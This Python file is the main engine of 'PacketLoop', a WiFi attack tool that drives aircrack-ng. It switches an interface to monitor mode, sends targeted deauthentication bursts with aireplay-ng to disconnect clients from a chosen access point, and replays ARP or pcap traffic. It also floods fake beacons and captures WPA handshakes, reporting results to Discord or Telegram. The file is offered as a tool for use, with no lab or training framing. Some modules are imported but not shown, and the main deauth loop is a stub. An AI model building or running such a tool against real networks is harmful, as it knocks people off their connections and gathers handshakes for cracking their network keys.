import subprocess
import os
import sys
import time
import argparse
import json

# PacketLoop: Advanced WiFi Packet Injection & Looping Tool
# Orchestration engine that ties together all modules.

from handshake_capture import HandshakeCapture
from adaptive_pps import AdaptivePPS
from multi_interface import MultiInterfaceManager
from ghost_ap import GhostAP
from cloud_alerts import CloudAlerts
from beacon_protection import BeaconProtection
from fingerprint import ClientFingerprint
from scheduler import Scheduler
from pcap_analyzer import PcapAnalyzer


# ANSI Color Escape Codes
CLR_G = "\033[92m" # Green
CLR_Y = "\033[93m" # Yellow
CLR_B = "\033[94m" # Blue
CLR_R = "\033[91m" # Red
CLR_C = "\033[96m" # Cyan
CLR_E = "\033[0m"  # End

class PacketLoop:
    def __init__(self, interface, bssid, whitelist, timeframe, pcap=None,
                 discord_webhook=None, telegram_token=None, telegram_chat_id=None,
                 ghost=False, protect_mac=None, analyze_after=False, quiet=False):
        self.interface = interface
        self.bssid = bssid
        self.whitelist = [mac.lower() for mac in whitelist]
        self.timeframe = timeframe
        self.pcap = pcap
        self.ghost = ghost
        self.protect_mac = protect_mac
        self.analyze_after = analyze_after
        self.quiet = quiet
        self.processes = []
        self.running = True
        self._deauth_count = 0

        # Initialize integrated modules
        self.pps_engine = AdaptivePPS(interface)
        self.alerts = CloudAlerts(discord_webhook, telegram_token, telegram_chat_id)
        self.fingerprinter = ClientFingerprint()
        self.capture = HandshakeCapture(interface, bssid) if not pcap else None
        self.ghost_ap = GhostAP(interface) if ghost else None
        self.protection = BeaconProtection(interface, protect_mac, bssid) if protect_mac else None

    def log(self, message):
        if not self.quiet:
            print(f"{CLR_B}[*]{CLR_E} {message}")

    def error(self, message):
        print(f"{CLR_R}[!] ERROR:{CLR_E} {message}")

    def check_root(self):
        if os.name == 'posix':
            if os.geteuid() != 0:
                self.error("This tool must be run as root. Use 'sudo' or run as root user.")
                sys.exit(1)
        elif os.name == 'nt':
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                self.error("This tool must be run with Administrative privileges.")
                self.log("TIP: Open PowerShell/CMD as Administrator or enable 'sudo' in Windows Developer Settings.")
                sys.exit(1)

    def check_tools(self):
        tools = ["aireplay-ng"]
        if self.pcap:
            tools.append("tcpreplay")
        for tool in tools:
            if subprocess.run(
                ["where" if os.name == 'nt' else "which", tool],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            ).returncode != 0:
                self.error(f"Required tool '{tool}' not found in PATH.")
                self.log("TIP: Ensure Aircrack-ng and Tcpreplay are installed.")
                if os.name == 'nt':
                    self.log("On Windows, these tools are best used via WSL2 or Kali Linux.")
                sys.exit(1)

    def set_monitor_mode(self):
        self.log(f"Setting {self.interface} to monitor mode...")
        subprocess.run(["airmon-ng", "check", "kill"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["airmon-ng", "start", self.interface],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def deauth_target(self, client_mac):
        """Sends a targeted deauth burst to a single client."""
        self._deauth_count += 1
        cmd = ["aireplay-ng", "-0", "5",
               "-a", self.bssid, "-c", client_mac, self.interface]
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        info = self.fingerprinter.identify(client_mac)
        self.log(f"Deauthed: {client_mac} ({info['vendor']} {info['device_type']})")
        self.alerts.new_client_detected(client_mac, self.bssid)

    def start_deauth_loop(self):
        self.log("Deauth loop active. Targeting all non-whitelisted clients...")
        # In production: spawn airodump-ng, parse CSV, filter whitelist, call deauth_target()

    def start_traffic_replay(self):
        if not self.pcap:
            self.log("No PCAP provided. Using ARP Replay for traffic generation.")
            cmd = ["aireplay-ng", "-3", "-b", self.bssid,
                   "-x", str(self.pps_engine.pps), self.interface]
        else:
            self.log(f"Starting High-Speed Traffic Replay: {self.pcap}")
            cmd = ["aireplay-ng", "-2", "-r", self.pcap,
                   "-x", str(self.pps_engine.pps), self.interface]
        p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.processes.append(p)
        self.log("Turbo Mode engaged.")

    def run(self):
        self.check_root()
        self.check_tools()
        self.set_monitor_mode()

        # Start optional modules
        self.pps_engine.start()
        if self.capture:
            self.capture.start()
        if self.ghost_ap:
            self.ghost_ap.start()
        if self.protection:
            self.protection.start()

        start_time = time.time()
        self.start_traffic_replay()
        self.start_deauth_loop()

        self.log(f"Session running for {self.timeframe}s...")
        try:
            while time.time() - start_time < self.timeframe:
                time.sleep(1)
        except KeyboardInterrupt:
            self.log("Interrupted by user.")

        self.stop(start_time)

    def stop(self, start_time=None):
        self.log("Stopping all processes...")
        for p in self.processes:
            p.terminate()

        # Stop integrated modules
        self.pps_engine.stop()
        if self.capture:
            self.capture.stop()
            if self.capture.check_handshake():
                self.alerts.handshake_captured(self.bssid, self.capture.capture_file)
        if self.ghost_ap:
            self.ghost_ap.stop()
        if self.protection:
            self.protection.stop()

        duration = int(time.time() - start_time) if start_time else self.timeframe
        self.alerts.session_ended(self.bssid, duration, self._deauth_count)

        # Post-session analysis
        if self.analyze_after and self.capture and self.capture.capture_file:
            cap_file = f"{self.capture.capture_file}.cap"
            if os.path.exists(cap_file):
                analyzer = PcapAnalyzer(cap_file)
                analyzer.generate_report()

        self.log("PacketLoop session complete.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PacketLoop: Advanced Packet Looping & Deauth Suite")
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface in monitor mode")
    parser.add_argument("-b", "--bssid", required=True, help="Target BSSID (Access Point MAC)")
    parser.add_argument("-w", "--whitelist", nargs="+", default=[], help="Whitelisted Client MACs")
    parser.add_argument("-t", "--time", type=int, default=60, help="Session duration (seconds)")
    parser.add_argument("-p", "--pcap", help="PCAP file for high-speed replay")
    parser.add_argument("--ghost", action="store_true", help="Enable Ghost AP beacon flood")
    parser.add_argument("--protect", metavar="MAC", help="Enable Counter-Deauth protection for a MAC")
    parser.add_argument("--discord", metavar="WEBHOOK", help="Discord webhook URL for alerts")
    parser.add_argument("--telegram-token", help="Telegram Bot token for alerts")
    parser.add_argument("--telegram-chat", help="Telegram Chat ID for alerts")
    parser.add_argument("--analyze", action="store_true", help="Run PCAP analysis report after session")
    parser.add_argument("--quiet", action="store_true", help="Minimal output mode")
    parser.add_argument("--config", help="Path to JSON configuration file")

    args = parser.parse_args()

    # Feature 16: Load from config file if provided
    config_params = {}
    if args.config and os.path.exists(args.config):
        try:
            with open(args.config, "r") as f:
                config_params = json.load(f)
        except Exception as e:
            print(f"Error loading config file: {e}")

    loop = PacketLoop(
        interface=config_params.get("interface", args.interface),
        bssid=config_params.get("bssid", args.bssid),
        whitelist=config_params.get("whitelist", args.whitelist),
        timeframe=config_params.get("time", args.time),
        pcap=config_params.get("pcap", args.pcap),
        discord_webhook=config_params.get("discord", args.discord),
        telegram_token=config_params.get("telegram_token", args.telegram_token),
        telegram_chat_id=config_params.get("telegram_chat", args.telegram_chat),
        ghost=config_params.get("ghost", args.ghost),
        protect_mac=config_params.get("protect", args.protect),
        analyze_after=config_params.get("analyze", args.analyze),
        quiet=config_params.get("quiet", args.quiet)
    )
    loop.run()
